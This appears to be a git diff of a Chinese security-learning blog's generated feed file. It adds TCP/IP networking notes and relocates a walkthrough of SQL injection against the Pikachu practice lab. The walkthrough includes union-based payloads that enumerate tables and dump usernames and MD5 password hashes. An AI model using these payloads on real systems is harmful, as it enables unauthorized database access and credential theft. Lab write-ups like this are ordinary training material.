+<h3 id="TCP-x2F-IP协议桟与OSI参考模型对应关系"><a href="#TCP-x2F-IP协议桟与OSI参考模型对应关系" class="headerlink" title="TCP&#x2F;IP协议桟与OSI参考模型对应关系"></a>TCP&#x2F;IP协议桟与OSI参考模型对应关系</h3><table>
+<thead>
+<tr>
+<th>TCP&#x2F;IP</th>
+<th>OSI</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>应用层</td>
+<td>应用层<br>表示层<br>会话层</td>
+</tr>
+<tr>
+<td>传输层</td>
+<td>传输层</td>
+</tr>
+<tr>
+<td>网络层</td>
+<td>网络层</td>
+</tr>
+<tr>
+<td>网络接入层</td>
+<td>数据链路层 <br> 物理层</td>
+</tr>
+</tbody></table>
+<h3 id="TCP-x2F-IP协议栈各层功能"><a href="#TCP-x2F-IP协议栈各层功能" class="headerlink" title="TCP&#x2F;IP协议栈各层功能"></a>TCP&#x2F;IP协议栈各层功能</h3><h4 id="应用层功能"><a href="#应用层功能" class="headerlink" title="应用层功能"></a>应用层功能</h4><p>为应用提供网络服务</p>
+<ul>
+<li>网络应用<ul>
+<li>微博、微信、QQ……</li>
+</ul>
+</li>
+<li>邮件服务（SMTP、POP3）<ul>
+<li>Outlook、新浪邮箱……</li>
+</ul>
+</li>
+<li>网页服务（http、https）<ul>
+<li>百度、搜狐、网易</li>
+</ul>
+</li>
+<li>网络管理<ul>
+<li>SNMP</li>
+</ul>
+</li>
+<li>远程登陆<ul>
+<li>Telnet、ssh</li>
+</ul>
+</li>
+<li>地址服务<ul>
+<li><pre><code>DNS、DHCP
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="传输层功能"><a href="#传输层功能" class="headerlink" title="传输层功能"></a>传输层功能</h4><p>提供端到端传输服务</p>
+<ul>
+<li>基于TCP的协议，可靠传输、有重传机制<ul>
+<li>FTP、SMTP、Telnet、HTTP</li>
+</ul>
+</li>
+<li>基于UDP的协议传输，不可靠、效率高<ul>
+<li>TFTP、SNMP、DHCP</li>
+</ul>
+</li>
+</ul>
+<p>TCP&#x2F;UDP端口号范围是<code>0~65535</code>，其中<code>0~1023</code>是熟知端口号，已固定分配给常用应用程序</p>
+<h4 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h4><ul>
+<li><p>提供主机到主机的传输服务</p>
+</li>
+<li><p>IP</p>
+<ul>
+<li>提供主机到主机的传输服务</li>
+</ul>
+</li>
+<li><p>ICMP</p>
+<ul>
+<li>辅助IP工作,提供出错和控制信息</li>
+</ul>
+</li>
+<li><p>ARP</p>
+<ul>
+<li>解析IP与MAC的映射</li>
+</ul>
+</li>
+</ul>
+<h4 id="网络接入层"><a href="#网络接入层" class="headerlink" title="网络接入层"></a>网络接入层</h4><ul>
+<li><p>在相邻节点提供数据传输服务</p>
+</li>
+<li><p>局域网</p>
+<ul>
+<li>IEEE802.2	定义LLC子层</li>
+<li>IEEE802.3 	以太网标准</li>
+</ul>
+</li>
+<li><p>广域网</p>
+<ul>
+<li>HDLC(高级数据链路控)协议)</li>
+<li>PPP(点对点协议,类别:数据链路层协议)</li>
+<li>Frame Relay(帧中继)</li>
+</ul>
+</li>
+</ul>
+<h3 id="常见协议端口号"><a href="#常见协议端口号" class="headerlink" title="常见协议端口号"></a>常见协议端口号</h3><h4 id="TCP端口号"><a href="#TCP端口号" class="headerlink" title="TCP端口号"></a>TCP端口号</h4><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>FTP</td>
+<td>21</td>
+<td>HTTP</td>
+<td>80</td>
+<td>SMTP</td>
+<td>25</td>
+</tr>
+<tr>
+<td>FT-daada</td>
+<td>20</td>
+<td>HTTPS</td>
+<td>443</td>
+<td>POP3</td>
+<td>110</td>
+</tr>
+<tr>
+<td>Telnet</td>
+<td>23</td>
+<td>SQL</td>
+<td>１４３３</td>
+<td>Tacacs＋</td>
+<td>４９</td>
+</tr>
+<tr>
+<td>SSH</td>
+<td>２２</td>
+<td>Oracle</td>
+<td>１５２１</td>
+<td>DNS</td>
+<td>５３</td>
+</tr>
+</tbody></table>
+<h4 id="UDP端口号"><a href="#UDP端口号" class="headerlink" title="UDP端口号"></a>UDP端口号</h4><table>
+<thead>
+<tr>
+<th align="center">协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+<th>协议</th>
+<th>端口号</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">DHCP</td>
+<td>67、68</td>
+<td>Radius</td>
+<td>1812、1813</td>
+<td>WINS</td>
+<td>42</td>
+</tr>
+<tr>
+<td align="center">TFTP</td>
+<td>69</td>
+<td>NTP</td>
+<td>123</td>
+<td>NETBIOS</td>
+<td>137、138、139</td>
+</tr>
+<tr>
+<td align="center">SNMP</td>
+<td>１６１、１６２</td>
+<td>RIP</td>
+<td>５２０</td>
+<td>DNS</td>
+<td>５３</td>
+</tr>
+</tbody></table>
+<h3 id="传输层的区别"><a href="#传输层的区别" class="headerlink" title="传输层的区别"></a>传输层的区别</h3><ul>
+<li>UDP报文结构简单，传输效率高，但不具备排序功能以及重传机制，数据包到达目的地时，有可能因为网 络问题，出现乱序或者丢包现象<ul>
+<li>常用在视频、语音应用等</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114916.png" alt="1" loading="lazy"></p>
+<ul>
+<li><p>TCP报文结构相对复杂，具备序列号、确认号、窗口大小等字段，使其具备排序功能、重传机制、滑动窗 口机制，确保数据传输的可靠性，使得数据能够准确按序到达目的地 </p>
+<ul>
+<li>常用在HTTP、FTP等可靠传输</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114918.png" alt="2" loading="lazy"></p>
+<h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><ul>
+<li><p>基于TCP协议</p>
+<ul>
+<li>传输数据前:由TCP建立连接</li>
+<li>传输过程中:由TCP解决可靠性、有序性，进行流量控制</li>
+<li>传输结束后：由TCP拆除链接</li>
+</ul>
+</li>
+<li><p>TCP头部字段</p>
+<ul>
+<li>端口号：源端口标识发送方的进程,目的端口表示接收方的进程</li>
+</ul>
+</li>
+<li><p>序列号:保证数据传输的有序性,确认收到的数据进行确认</p>
+<ul>
+<li>窗口大小:传输阶段每次连续发送数据的大小</li>
+</ul>
+</li>
+<li><p>Flag字段:</p>
+<ul>
+<li>ACK:确认标志号,置于1表示确认号有效,表示收到虽短的特定数据<ul>
+<li>RST:复位标志.至于1表示拒绝错误和非法的数据包,复位错误的链接</li>
+</ul>
+</li>
+<li>SYN:同步标志序号,至于1表示同步需要,用来建立连接<ul>
+<li>FIN:结束标志,至于1表示链接将被断开,用于拆除链接</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114921.png" alt="3" loading="lazy"></p>
+<h3 id="TCP协议工作过程"><a href="#TCP协议工作过程" class="headerlink" title="TCP协议工作过程"></a>TCP协议工作过程</h3><h4 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h4><p>数据传输之前：三次握手建立连接</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114923.png" alt="4" loading="lazy"></p>
+<h4 id="数据传输"><a href="#数据传输" class="headerlink" title="数据传输"></a>数据传输</h4><p> 数据传输过程中，发送方发送窗口大小的数据，接收方只进行一次确认</p>
+<p> 如果接收方处理能力不足，会调整窗口大小，接收方按新的窗口进行数据发送</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114925.png" alt="5" loading="lazy"></p>
+<h4 id="重传机制"><a href="#重传机制" class="headerlink" title="重传机制"></a>重传机制</h4><p> 当某个包因网络问题，传输失败，接收方仅确认上一个数据包 </p>
+<p>发送方将根据确认号，进行数据重传</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114927.png" alt="6" loading="lazy"></p>
+<h4 id="拆除连接"><a href="#拆除连接" class="headerlink" title="拆除连接"></a>拆除连接</h4><p>四次挥手拆除连接， TCP通过FIN置位为1表示拆除连接</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/burp/20220602114929.png" alt="7" loading="lazy"></p>
 ]]></content>
       <categories>
         <category>学习</category>
@@ -3738,125 +3738,6 @@ Received 23358 broadcasts, 0 runts, 0 giants
       </tags>
   </entry>
   <entry>
-    <title>Pikachu--SQL注入(一)</title>
-    <url>/posts/22ddbd5a/</url>
-    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
-<p> 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</p>
-</blockquote>
-<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
-<h2 id="QLS注入攻击总体思路"><a href="#QLS注入攻击总体思路" class="headerlink" title="QLS注入攻击总体思路"></a>QLS注入攻击总体思路</h2><ol>
-<li>寻找SQL注入位置</li>
-<li>判断服务器类型和后台数据类型</li>
-<li>针对不同的服务器和数据库特点进行SQL注入攻击</li>
-</ol>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>首先打开burp抓包，发现时post方法</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190944.png" alt="1" loading="lazy"></p>
-<h4 id="方法一：利用burp改包"><a href="#方法一：利用burp改包" class="headerlink" title="方法一：利用burp改包"></a>方法一：利用burp改包</h4><pre class="language-none"><code class="language-none">id&#x3D;1 or 1&#x3D;1#		</code></pre>
-
-<p>可以看到，页面将所有id的信息返回了，可知存在数字型注入。</p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190948.png" alt="2" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1&#39; 					 报错，可判断存在SQL注入</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190951.png" alt="3" loading="lazy"></p>
-<p>确定回显字段</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 order by 3			报错</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191206.png" alt="4" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 order by 2 		存在两个回显，字段数为2</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191211.png" alt="5" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,2		判断回显点，可以在1和2这两处位置，获得我们想要的信息</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191213.png" alt="6" loading="lazy"></p>
-<p>查询数据库名称</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select user(),database() 	 用户名为root@locallhost，数据库为pikachu</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191216.png" alt="7" loading="lazy"></p>
-<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;</code></pre>
-
-
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191218.png" alt="8" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191221.png" alt="9" loading="lazy"></p>
-<p>查询user下所有表名</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#    </code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191223.png" alt="10" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_schema&#x3D;database()#      </code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191226.png" alt="11" loading="lazy"></p>
-<p>查询字段username和password的内容</p>
-<pre class="language-none"><code class="language-none">id&#x3D;1 union select group_concat(username),group_concat(password) from users</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191229.png" alt="12" loading="lazy"></p>
-<h4 id="方法二、利用harbar"><a href="#方法二、利用harbar" class="headerlink" title="方法二、利用harbar"></a>方法二、利用harbar</h4><p>（Todo代办）</p>
-<p>对应账号和MD5加密的密码：</p>
-<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
-<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
-<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
-<h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>输入： </p>
-<pre class="language-none"><code class="language-none">select id,email from member where username&#x3D;&#39;&#39; or 1&#x3D;1-- q&#39;
-或
-?name&#x3D;%27&amp;submit&#x3D;查询     %27  &#x3D;&#x3D; &#39;  get</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191233.png" alt="13" loading="lazy"></p>
-<p>也可以直接在url中的name参数后进行修改</p>
-<pre class="language-none"><code class="language-none">name&#x3D;%27&amp;submit&#x3D;查询				报错，判断存在SQL注入</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191236.png" alt="14" loading="lazy"></p>
-<p>查询出所有账户数据</p>
-<pre class="language-none"><code class="language-none">&#39; or 1&#x3D;1-- q			</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191238.png" alt="15" loading="lazy"></p>
-<p>确定回显字段</p>
-<pre class="language-none"><code class="language-none">&#39; order by 3 -- q		报错</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191240.png" alt="16" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; order by 2 -- q				有两个回显</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191243.png" alt="17" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; union select 1,2 -- q				判断回显点</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191246.png" alt="18" loading="lazy"></p>
-<pre class="language-none"><code class="language-none">&#39; union select user(),database() -- q		可知用户名为root@localhost，数据库名为pikachu</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191249.png" alt="19" loading="lazy"></p>
-<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
-<pre class="language-none"><code class="language-none">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191256.png" alt="20" loading="lazy"></p>
-<p>查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</p>
-<pre class="language-none"><code class="language-none">&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191259.png" alt="21" loading="lazy"></p>
-<p>查询字段username和password的内容</p>
-<pre class="language-none"><code class="language-none">&#39; union select group_concat(username),group_concat(password) from users -- q</code></pre>
-
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png" alt="22" loading="lazy"></p>
-<hr>
-<p>参考链接： </p>
-<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
-<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Pikachu-SQL注入（三）</title>
     <url>/posts/49a53027/</url>
     <content><![CDATA[<h3 id="insert-amp-update注入"><a href="#insert-amp-update注入" class="headerlink" title="insert&amp;update注入"></a>insert&amp;update注入</h3><p>insert&#x2F;update是插入和更新的意思，这两个场景的注入，post数据包里的每一个参数都可以注入</p>
@@ -4000,6 +3881,125 @@ Received 23358 broadcasts, 0 runts, 0 giants
       </tags>
   </entry>
   <entry>
+    <title>Pikachu--SQL注入(一)</title>
+    <url>/posts/22ddbd5a/</url>
+    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><blockquote>
+<p> 在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。</p>
+</blockquote>
+<p>一个严重的SQL注入漏洞，可能会直接导致一家公司破产！<br>SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。</p>
+<h2 id="QLS注入攻击总体思路"><a href="#QLS注入攻击总体思路" class="headerlink" title="QLS注入攻击总体思路"></a>QLS注入攻击总体思路</h2><ol>
+<li>寻找SQL注入位置</li>
+<li>判断服务器类型和后台数据类型</li>
+<li>针对不同的服务器和数据库特点进行SQL注入攻击</li>
+</ol>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="数字型注入（post）"><a href="#数字型注入（post）" class="headerlink" title="数字型注入（post）"></a>数字型注入（post）</h3><p>首先打开burp抓包，发现时post方法</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190944.png" alt="1" loading="lazy"></p>
+<h4 id="方法一：利用burp改包"><a href="#方法一：利用burp改包" class="headerlink" title="方法一：利用burp改包"></a>方法一：利用burp改包</h4><pre class="language-none"><code class="language-none">id&#x3D;1 or 1&#x3D;1#		</code></pre>
+
+<p>可以看到，页面将所有id的信息返回了，可知存在数字型注入。</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190948.png" alt="2" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1&#39; 					 报错，可判断存在SQL注入</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506190951.png" alt="3" loading="lazy"></p>
+<p>确定回显字段</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 order by 3			报错</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191206.png" alt="4" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 order by 2 		存在两个回显，字段数为2</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191211.png" alt="5" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,2		判断回显点，可以在1和2这两处位置，获得我们想要的信息</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191213.png" alt="6" loading="lazy"></p>
+<p>查询数据库名称</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select user(),database() 	 用户名为root@locallhost，数据库为pikachu</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191216.png" alt="7" loading="lazy"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39;</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191218.png" alt="8" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191221.png" alt="9" loading="lazy"></p>
+<p>查询user下所有表名</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;#    </code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191223.png" alt="10" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select 1, group_concat(column_name) from information_schema.columns where table_schema&#x3D;database()#      </code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191226.png" alt="11" loading="lazy"></p>
+<p>查询字段username和password的内容</p>
+<pre class="language-none"><code class="language-none">id&#x3D;1 union select group_concat(username),group_concat(password) from users</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191229.png" alt="12" loading="lazy"></p>
+<h4 id="方法二、利用harbar"><a href="#方法二、利用harbar" class="headerlink" title="方法二、利用harbar"></a>方法二、利用harbar</h4><p>（Todo代办）</p>
+<p>对应账号和MD5加密的密码：</p>
+<p>admin：e10adc3949ba59abbe56e057f20f883e（123456）</p>
+<p>pikachu：670b14728ad9902aecba32e22fa4f6bd（000000）</p>
+<p>test：e99a18c428cb38d5f260853678922e03（abc123）</p>
+<h3 id="字符型注入（get）"><a href="#字符型注入（get）" class="headerlink" title="字符型注入（get）"></a>字符型注入（get）</h3><p>输入： </p>
+<pre class="language-none"><code class="language-none">select id,email from member where username&#x3D;&#39;&#39; or 1&#x3D;1-- q&#39;
+或
+?name&#x3D;%27&amp;submit&#x3D;查询     %27  &#x3D;&#x3D; &#39;  get</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191233.png" alt="13" loading="lazy"></p>
+<p>也可以直接在url中的name参数后进行修改</p>
+<pre class="language-none"><code class="language-none">name&#x3D;%27&amp;submit&#x3D;查询				报错，判断存在SQL注入</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191236.png" alt="14" loading="lazy"></p>
+<p>查询出所有账户数据</p>
+<pre class="language-none"><code class="language-none">&#39; or 1&#x3D;1-- q			</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191238.png" alt="15" loading="lazy"></p>
+<p>确定回显字段</p>
+<pre class="language-none"><code class="language-none">&#39; order by 3 -- q		报错</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191240.png" alt="16" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; order by 2 -- q				有两个回显</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191243.png" alt="17" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; union select 1,2 -- q				判断回显点</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191246.png" alt="18" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">&#39; union select user(),database() -- q		可知用户名为root@localhost，数据库名为pikachu</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191249.png" alt="19" loading="lazy"></p>
+<p>查询数据库pikachu下的所有表名httpinfo,member,message,users,xssblind</p>
+<pre class="language-none"><code class="language-none">&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;pikachu&#39; -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191256.png" alt="20" loading="lazy"></p>
+<p>查询user下所有表明 user_id,first_name,last_name,user,password,avatar,last_login,failed_login,id,username,password,level,id,username,password</p>
+<pre class="language-none"><code class="language-none">&#39; union select 1, group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39; -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191259.png" alt="21" loading="lazy"></p>
+<p>查询字段username和password的内容</p>
+<pre class="language-none"><code class="language-none">&#39; union select group_concat(username),group_concat(password) from users -- q</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/Pikachu_SQL/20220506191303.png" alt="22" loading="lazy"></p>
+<hr>
+<p>参考链接： </p>
+<p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
+<p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
+]]></content>
+      <categories>
+        <category>学习</category>
+        <category>web安全</category>
+        <category>Pikachu</category>
+      </categories>
+      <tags>
+        <tag>pikachu</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Pikachu--SQL注入（二）</title>
     <url>/posts/8764d02d/</url>
     <content><![CDATA[<h3 id="搜索型注入"><a href="#搜索型注入" class="headerlink" title="搜索型注入"></a>搜索型注入</h3><p>由题可知是搜索型注入(get)，可直接在url中的name参数后进行修改，本质还是字符型注入，只是闭合不一样。</p>
@@ -4086,120 +4086,6 @@ Received 23358 broadcasts, 0 runts, 0 giants
 <p>参考链接： </p>
 <p>无垠安全：<a href="https://www.wuyini.cn/952.html">https://www.wuyini.cn/952.html</a></p>
 <p>Pikachu靶场通关之SQL注入 - FreeBuf网络安全行业门户：<a href="https://www.freebuf.com/articles/web/254079.html">https://www.freebuf.com/articles/web/254079.html</a></p>
-]]></content>
-      <categories>
-        <category>学习</category>
-        <category>web安全</category>
-        <category>Pikachu</category>
-      </categories>
-      <tags>
-        <tag>pikachu</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Pikachu--暴力破解</title>
-    <url>/posts/95e7ce5d/</url>
-    <content><![CDATA[<h2 id="Burte-Force（暴力破解）概述"><a href="#Burte-Force（暴力破解）概述" class="headerlink" title="Burte Force（暴力破解）概述"></a>Burte Force（暴力破解）概述</h2><p>“暴力破解”是一攻击具手段，在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。 其过程就是使用大量的认证信息在认证接口进行尝试登录，直到得到正确的结果。 为了提高效率，暴力破解一般会使用带有字典的工具来进行自动化操作。<br>理论上来说，大多数系统都是可以被暴力破解的，只要攻击者有足够强大的计算能力和时间，所以断定一个系统是否存在暴力破解漏洞，其条件也不是绝对的。 我们说一个web应用系统存在暴力破解漏洞，一般是指该web应用系统没有采用或者采用了比较弱的认证安全策略，导致其被暴力破解的“可能性”变的比较高。 这里的认证安全策略, 包括：<br>1.是否要求用户设置复杂的密码；<br>2.是否每次认证都使用安全的验证码（想想你买火车票时输的验证码～）或者手机otp；<br>3.是否对尝试登录的行为进行判断和限制（如：连续5次错误登录，进行账号锁定或IP地址锁定等）；<br>4.是否采用了双因素认证；<br>…等等。</p>
-<h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><ol>
-<li>设置代理（这里以谷歌浏览器为例）</li>
-</ol>
-<ul>
-<li>点击右上角的三个点，选择设置、高级、系统、打开您计算机的代理设置</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956010.png" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956440.png" loading="lazy"></p>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956733.png" loading="lazy"></p>
-<ul>
-<li>在Internet选项里点击 连接、局域网设置、</li>
-</ul>
-<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130956489.png" loading="lazy"></p>
